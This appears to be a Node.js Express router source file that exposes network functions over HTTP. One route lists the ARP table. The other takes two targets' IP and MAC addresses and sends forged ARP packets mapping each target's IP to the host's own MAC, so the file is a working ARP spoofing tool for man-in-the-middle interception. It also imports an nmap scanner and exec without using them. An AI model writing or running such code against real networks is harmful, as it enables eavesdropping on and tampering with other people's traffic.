'use strict';
var router = require('express').Router();
module.exports = router;
var _ = require('lodash');
var arp = require('arpjs');
var util = require('util');
var ip = require('ip');
var exec = require('child_process').exec;
var scanner = require('node-libnmap')
var done = false;
var getmac = require('getmac');
var myip = ip.address()
var mymac = null;

router.get('/', function (req, res, next) {
  arp.table(function(err, table){
    res.status(200).send(table)
  })
});

router.put('/:toip/:tomac/:ttip/:ttmac', function (req, res, next){
  getmac.getMac(function(err, mac){
    arp.send({
      'op': 'request',
      'src_ip': req.params.ttip,  // Target Twos IP Address
      'dst_ip': req.params.toip,  // Target Ones IP Address
      'src_mac': mac,             // My MAC Address
      'dst_mac': req.params.tomac // Target One's Mac Adddress
    })
    arp.send({
      'op': 'request',
      'src_ip': req.params.toip,  // Target Ones's IP
      'dst_ip': req.params.ttip,  // Target Two's IP
      'src_mac': mac,             // My MAC Address
      'dst_mac': req.params.ttmac // Target Two's Mac Address
    })
    arp.send({
      'op': 'request',
      'src_ip': req.params.ttip,  // Target Twos IP Address
      'dst_ip': req.params.toip,  // Target Ones IP Address
      'src_mac': mac,             // My MAC Address
      'dst_mac': req.params.tomac // Target One's Mac Adddress
    })
    arp.send({
      'op': 'request',
      'src_ip': req.params.toip,  // Target Ones's IP
      'dst_ip': req.params.ttip,  // Target Two's IP
      'src_mac': mac,             // My MAC Address
      'dst_mac': req.params.ttmac // Target Two's Mac Address
    })
  })
  res.status(200).send();
})
